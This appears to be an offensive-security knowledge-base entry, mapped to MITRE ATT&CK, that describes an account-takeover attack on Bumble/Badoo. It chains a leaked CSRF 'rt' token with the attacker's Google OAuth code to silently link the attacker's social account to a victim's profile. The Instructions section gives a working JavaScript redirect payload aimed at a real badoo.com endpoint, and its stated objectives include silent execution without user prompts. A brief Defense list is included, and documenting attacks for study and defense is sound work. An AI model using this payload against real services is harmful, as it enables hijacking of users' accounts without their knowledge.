---
tags:
  - csrf
  - redirect
  - oauth-abuse
  - verification-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: afd30343-ec95-4047-9fa1-76ed9ad7c9b9
created_at: '2025-12-14T17:33:24.527Z'
updated_at: '2025-12-14T17:33:24.527Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft Malicious Redirect to Social Account Verification Endpoint

## Summary

This procedure constructs a verification URL incorporating the extracted 'rt' token and the attacker's social authorization code, then redirects the victim's browser to force unauthorized account linkage without CSRF validation.

## Description

With the 'rt' token in hand, the attacker builds a Google OAuth verification URL for Bumble's endpoint, appending the token to bypass protections. The attacker's pre-obtained 'code' from their social account (e.g., Gmail OAuth flow) is included. Upon PoC page load, JavaScript redirects the victim, submitting the request in their authenticated context. This links the attacker's social account to the victim's Bumble profile silently, as the endpoint trusts the leaked 'rt'.

## Requirements

1. Extracted 'rt' token from previous step
2. Attacker's social OAuth code (obtained via legitimate flow on their account)
3. Victim's session active in browser

## Defense

Defensive measures and detection strategies:

- Use double-submit cookies or synchronized tokens for CSRF, not single query params
- Validate social linkage requests with additional user confirmation (e.g., OTP)
- Log and alert on rapid linkage attempts or mismatched referrers

## Objectives

1. Bypass CSRF using leaked token
2. Force social account linkage via redirect
3. Ensure silent execution without user prompts

## Instructions

### Step 1: Obtain Attacker's OAuth Code

**Context**: Prepare the social authorization code from the attacker's side.

Initiate a Google OAuth flow for the attacker: Visit https://accounts.google.com/o/oauth2/auth?client_id=<bumble_client_id>&redirect_uri=<bumble_uri>&scope=...&response_type=code, capture the 'code' parameter from the callback.

> Example code: '4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc'. Store for URL construction.

### Step 2: Build and Execute Redirect

**Context**: Assemble the full URL and redirect in the PoC.

In the PoC JavaScript, after extraction:

```javascript
var attacker_code = '4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc';
var session_state = '7cb85df679219ce71044666c7be3e037ff54b560..a810';
var url = 'https://eu1.badoo.com/google/verify.phtml?code=' + attacker_code + '&authuser=3&session_state=' + session_state + '&prompt=none&rt=' + csrf_code;
window.location.href = url;
```

> This redirects immediately. The endpoint processes the linkage using the valid 'rt'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[redirect]]
- [[oauth-abuse]]
